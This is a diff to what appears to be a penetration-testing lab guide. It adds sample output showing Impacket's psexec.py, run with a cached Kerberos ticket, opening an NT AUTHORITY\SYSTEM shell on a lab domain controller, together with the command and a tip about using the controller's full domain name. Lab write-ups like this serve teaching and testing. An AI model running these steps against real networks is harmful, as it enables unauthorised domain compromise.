@@ -54,9 +54,29 @@ Now you will need to add your domain details and IP address to your /etc/hosts f
 
 ## Impacket psexec.py
 
-Once everything above has been set you will now be able to use Impackets psexec.py script to get a shell on the domain controller as NT AUTHORITY\SYSTEM:
+Once everything above has been set you will now be able to use Impackets psexec.py script to get a shell on the domain controller as NT AUTHORITY\SYSTEM using the following command:
 
 `sudo python psexec.py -k -no-pass marvel.local/badman@hydra-dc.marvel.local`
+
+The output should look like:
+
+```
+[+] Trying to connect to KDC at MARVEL.LOCAL
+[+] Using Kerberos Cache: /tmp/badman.ccache
+[+] SPN CIFS/HYDRA-DC.MARVEL.LOCAL@MARVEL.LOCAL not found in cache
+[+] AnySPN is True, looking for another suitable SPN
+[+] Returning cached credential for KRBTGT/MARVEL.LOCAL@MARVEL.LOCAL
+[+] Using TGT from cache
+[+] Trying to connect to KDC at MARVEL.LOCAL
+Microsoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>
+
+```
 
 Note that in the command above you MUST specify the fully qualified domain name for the domain controller `hydra-dc.marvel.local`.  If you only specify the IP address it will not work and show the error:
 
